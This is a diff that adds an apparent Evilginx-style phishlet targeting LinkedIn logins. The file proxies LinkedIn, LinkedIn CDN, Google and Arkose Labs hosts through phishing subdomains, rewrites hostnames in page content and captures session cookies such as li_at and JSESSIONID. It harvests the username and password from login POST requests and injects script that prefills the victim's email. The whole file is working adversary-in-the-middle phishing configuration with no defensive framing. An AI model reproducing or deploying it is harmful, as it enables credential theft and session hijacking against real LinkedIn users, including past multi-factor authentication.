@@ -1,0 +1,66 @@
+min_ver: '3.0.0'
+redirect_url: 'https://www.linkedin.com/feed/'
+
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'linkedin.com', session: true, is_landing: true}
+  - {phish_sub: 'static', orig_sub: 'static', domain: 'licdn.com', session: false, is_landing: false}
+  - {phish_sub: 'media', orig_sub: 'media', domain: 'licdn.com', session: false, is_landing: false}
+  - {phish_sub: 'g', orig_sub: 'www', domain: 'google.com', session: true, is_landing: false}
+  - {phish_sub: 'ga', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: false}
+  - {phish_sub: 'iframe', orig_sub: 'iframe', domain: 'arkoselabs.com', session: false, is_landing: false}
+  - {phish_sub: 'client-api', orig_sub: 'client-api', domain: 'arkoselabs.com', session: false, is_landing: false}
+
+sub_filters:
+  - {triggers_on: 'www.linkedin.com', orig_sub: "", domain: 'linkedin.com', search: '{hostname_regex}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.linkedin.com', orig_sub: "", domain: 'licdn.com', search: '{hostname_regex}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.linkedin.com', orig_sub: 'www', domain: 'linkedin.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.linkedin.com', orig_sub: 'static', domain: 'licdn.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.linkedin.com', orig_sub: 'media', domain: 'licdn.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.linkedin.com', orig_sub: 'iframe', domain: 'arkoselabs.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'static.licdn.com', orig_sub: 'iframe', domain: 'arkoselabs.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.linkedin.com', orig_sub: 'client-api', domain: 'arkoselabs.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.linkedin.com', orig_sub: 'www', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.linkedin.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+
+auth_tokens:
+  - domain: '.www.linkedin.com'
+    keys: ['JSESSIONID', 'bscookie', 'li_at', 'li_theme:opt', 'li_theme_set:opt', 'timezone']
+    type: 'cookie'
+  - domain: '.linkedin.com'
+    keys: ['bcookie', 'lang:opt', 'lidc:opt', 'liap:opt', '.*:regexp']
+    type: 'cookie'
+
+credentials:
+  username:
+    key: 'session_key'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'session_password'
+    search: '(.*)'
+    type: 'post'
+
+auth_urls:
+  - '/feed'
+  - '/feed/'
+
+login:
+  domain: 'www.linkedin.com'
+  path: '/uas/login'
+
+js_inject:
+  - trigger_domains: ["www.linkedin.com"]
+    trigger_paths: ["/uas/login"]
+    trigger_params: ["email"]
+    script: |
+      function lp(){
+        var email = document.querySelector("#username");
+        var password = document.querySelector("#password");
+        if (email != null && password != null) {
+          email.value = "{email}";
+          password.focus();
+          return;
+        }
+        setTimeout(function(){lp();}, 100);
+      }
+      setTimeout(function(){lp();}, 100);
